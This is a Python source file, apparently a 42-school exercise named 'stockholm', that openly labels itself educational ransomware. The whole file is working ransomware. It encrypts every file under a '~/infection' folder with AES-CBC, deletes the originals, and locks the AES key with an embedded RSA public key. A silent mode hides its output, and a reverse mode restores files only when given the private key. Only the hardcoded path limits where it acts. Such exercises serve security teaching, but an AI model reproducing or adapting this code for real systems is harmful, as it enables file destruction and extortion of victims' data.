# **************************************************************************** #
#                                                                              #
#                                                         :::      ::::::::    #
#    stockholm.py                                       :+:      :+:    :+:    #
#                                                     +:+ +:+         +:+      #
#    By: guferrei <guferrei@student.42sp.org.br>    +#+  +:+       +#+         #
#                                                 +#+#+#+#+#+   +#+            #
#    Created: 2025/02/14 21:33:17 by guferrei          #+#    #+#              #
#    Updated: 2025/02/24 16:08:01 by guferrei         ###   ########.fr        #
#                                                                              #
# **************************************************************************** #

import argparse, glob, os
from os.path import expanduser
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding
from Crypto.Cipher import AES

PATH = expanduser("~") + "/infection"
PUBLIC_KEY = b"""-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCgrHmM9fzuQqG/La/Hv3e+OIjz
cP2T4a/yMkanD1nzMrlsLWqMtFC/Gc+2Gk2DG0nvqF4OWh91yHO/IZasdCdkg5uL
vu+/lNZzEHW3kO73ewUF/e3F/Vc072CnmsjFrUh7BgikodmbKL2On+1cQqXGrw2L
+vyY/rxNNDY5OaleMwIDAQAB
-----END PUBLIC KEY-----"""

def program_args():
	parser = argparse.ArgumentParser(description="This program is a Ransomware, be careful!!! This project is for educational purposes only. You should never use this type of program for malicious purposes.")
	group = parser.add_mutually_exclusive_group()
	group.add_argument('-v', '--version', action="store_true", help="show the version of the program")
	group.add_argument('-r', '--reverse', type=str, help="reverse the infection, must be followed by the key to decryption")
	group.add_argument('-s', '--silent', action="store_true", help="run the program in silent mode")
	return parser.parse_args()

def print_version():
	print("stockholm 1.0.0")

def get_files(filter):
	file_list = []
	for file in glob.glob(PATH + filter, recursive=True):
		if os.path.isfile(file):
			file_list.append(file)
	return file_list

def load_file_content(file):
	with open(file, 'rb') as f:
		data = f.read()
		return data

def pad(data):
	padding_length = 16 - len(data) % 16
	padding = bytes([padding_length] * padding_length)
	return data + padding

def unpad(data):
	padding_length = data[-1]
	if padding_length < 1 or padding_length > 16:
		raise ValueError("Invalid padding encountered")
	return data[:-padding_length]

def encrypt_key(public_key, aes_key):
	ciphertext = public_key.encrypt(
			aes_key,
			padding.OAEP(
				mgf=padding.MGF1(
				algorithm=hashes.SHA256()),
				algorithm=hashes.SHA256(),
				label=None
			)
		)
	with open(PATH + "/key.pem", 'wb') as f:
		f.write(ciphertext)

def decrypt_key(private_key):
	ciphertext = load_file_content(PATH + "/key.pem")
	if ciphertext:
		try:
			plaintext = private_key.decrypt(
				ciphertext,
				padding.OAEP(
					mgf=padding.MGF1(
					algorithm=hashes.SHA256()),
					algorithm=hashes.SHA256(),
					label=None
				)
			)
			return plaintext
		except:
			raise Exception

def encrypt_file(file, key, iv, args):
	if not args.silent:
		print("ecrypting file {}...".format(file))

	plaintext = load_file_content(file)
	padded_plaintext = pad(plaintext)
	cipher = AES.new(key, AES.MODE_CBC, iv)
	ciphertext = cipher.encrypt(padded_plaintext)

	with open(file+'.ft', 'wb') as f:
		f.write(iv + ciphertext)
	os.remove(file)

def decrypt_file(file, key):
	with open(file, 'rb') as f:
		iv = f.read(16)
		ciphertext = f.read()

	cipher = AES.new(key, AES.MODE_CBC, iv)
	plaintext = cipher.decrypt(ciphertext)
	decrypted_data = unpad(plaintext)

	with open(file.removesuffix('.ft'), 'wb') as f:
		f.write(decrypted_data)
	os.remove(file)

def run(args):
	file_list = get_files("/**/*")
	try:
		public_key = serialization.load_pem_public_key(PUBLIC_KEY)
	except:
		if not args.silent:
			print("Public key is invalid. Generate a valid 1024 bit public key!!!")
		return

	key = os.urandom(32)
	iv = os.urandom(16)
	encrypt_key(public_key, key)

	for file in file_list:
		try:
			encrypt_file(file, key, iv, args)
		except:
			if not args.silent:
				print("File Encryption Failed! Make sure you are using an RSA public key of at least 1024 bits")
			return
	if not args.silent:
		print("Encryption Successful")

def reverse(key: str, args):
	file_list = get_files("/**/*.ft")
	try:
		private_key = serialization.load_pem_private_key(key.encode(), password=None)
	except:
		print("Private key is invalid. Decryption failed!!")
		return

	try:
		key = decrypt_key(private_key)
	except:
		if not args.silent:
			print("Key Decryption Failed! This is not the right private key")
		return

	for file in file_list:
		try:
			decrypt_file(file, key)
		except:
			if not args.silent:
				print("File Decryption Failed! This is not the right AES key")
			return
	if os.path.exists(PATH + "/key.pem"):
		os.remove(PATH + "/key.pem")
	if not args.silent:
		print("Decryption Successful")

def main():
	args = program_args()
	if args.version:
		print_version()
	if args.reverse:
		reverse(args.reverse, args)
		return
	run(args)

if __name__ == '__main__':
	main()